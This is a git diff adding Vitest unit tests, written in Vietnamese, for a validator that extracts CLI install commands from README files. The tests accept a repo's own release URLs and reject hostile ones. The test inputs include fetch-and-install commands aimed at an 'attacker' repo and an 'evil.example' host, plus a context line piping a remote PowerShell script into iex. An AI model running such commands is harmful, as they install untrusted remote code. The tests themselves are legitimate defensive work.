@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import {
   HeDieuHanhCli,
+  MaTrinhQuanLyGoi,
   NhomCachCai,
   PhanCungYeuCau,
   boDauNhacShell,
@@ -1421,6 +1422,87 @@ irm https://example.com/install.ps1 | iex
 `;
       const resWin = bocTachHuongDanTuCodeBlocks(mdWin, mdWin, 'owner/win-app');
       expect(resWin?.cachCai[0]?.heDieuHanh).toBe(HeDieuHanhCli.WINDOWS);
+    });
+  });
+
+  describe('Luật 3 (11/11/2026): Nhận lệnh cài từ URL bản phát hành của chính repo (Agent-Reach)', () => {
+    it('nhận lệnh uv tool install từ URL release asset của chính repo (Agent-Reach)', () => {
+      const md = `
+## Installation
+\`\`\`bash
+uv tool install https://github.com/Panniantong/Agent-Reach/releases/latest/download/agent-reach.zip
+\`\`\`
+`;
+      const res = trichXuatHuongDanCliBangQuyTac(md, 'https://github.com/Panniantong/Agent-Reach');
+      expect(res).not.toBeNull();
+      expect(coCachCaiCliHopLe(res)).toBe(true);
+      const cach = res?.cachCai[0];
+      expect(cach?.nhom).toBe(NhomCachCai.PIP);
+      expect(cach?.trinhQuanLy).toBe(MaTrinhQuanLyGoi.PIP);
+      expect(cach?.tenGoi).toBe('Panniantong/Agent-Reach');
+      // Không sinh lệnh cập nhật hay gỡ giả (giống npx)
+      expect(cach?.lenhCapNhat || '').toBe('');
+      expect(cach?.lenhGo || '').toBe('');
+    });
+
+    it('nhận các định dạng .whl và git+https của chính repo', () => {
+      const mdWhl = `
+\`\`\`bash
+pip install https://github.com/Panniantong/Agent-Reach/releases/download/v1.6.1/agent_reach-1.6.1-py3-none-any.whl
+\`\`\`
+`;
+      const resWhl = trichXuatHuongDanCliBangQuyTac(mdWhl, 'Panniantong/Agent-Reach');
+      expect(coCachCaiCliHopLe(resWhl)).toBe(true);
+      expect(resWhl?.cachCai[0]?.tenGoi).toBe('Panniantong/Agent-Reach');
+
+      const mdGit = `
+\`\`\`bash
+pip install git+https://github.com/Panniantong/Agent-Reach.git@v1.6.1
+\`\`\`
+`;
+      const resGit = trichXuatHuongDanCliBangQuyTac(mdGit, 'Panniantong/Agent-Reach');
+      expect(coCachCaiCliHopLe(resGit)).toBe(true);
+      expect(resGit?.cachCai[0]?.tenGoi).toBe('Panniantong/Agent-Reach');
+    });
+
+    it('chốt chặn D-38: URL của repo khác bị loại', () => {
+      const mdAttacker = `
+\`\`\`bash
+uv tool install https://github.com/attacker/x/releases/latest/download/x.zip
+\`\`\`
+`;
+      const resAttacker = trichXuatHuongDanCliBangQuyTac(mdAttacker, 'foo/bar');
+      expect(coCachCaiCliHopLe(resAttacker)).toBe(false);
+    });
+
+    it('loại các URL độc hại hoặc host lạ (evil.example, http://, user:pass@, --index-url)', () => {
+      const mdEvil = `
+\`\`\`bash
+pip install https://evil.example/x.whl
+\`\`\`
+`;
+      expect(coCachCaiCliHopLe(trichXuatHuongDanCliBangQuyTac(mdEvil, 'foo/bar'))).toBe(false);
+
+      const mdHttp = `
+\`\`\`bash
+pip install http://github.com/foo/bar/releases/download/v1/x.zip
+\`\`\`
+`;
+      expect(coCachCaiCliHopLe(trichXuatHuongDanCliBangQuyTac(mdHttp, 'foo/bar'))).toBe(false);
+
+      const mdAuth = `
+\`\`\`bash
+pip install https://user:pass@github.com/foo/bar/releases/download/v1/x.zip
+\`\`\`
+`;
+      expect(coCachCaiCliHopLe(trichXuatHuongDanCliBangQuyTac(mdAuth, 'foo/bar'))).toBe(false);
+
+      const mdIndexUrl = `
+\`\`\`bash
+pip install https://github.com/foo/bar/releases/download/v1/x.whl --extra-index-url https://pypi.org/simple
+\`\`\`
+`;
+      expect(coCachCaiCliHopLe(trichXuatHuongDanCliBangQuyTac(mdIndexUrl, 'foo/bar'))).toBe(false);
     });
   });
 });
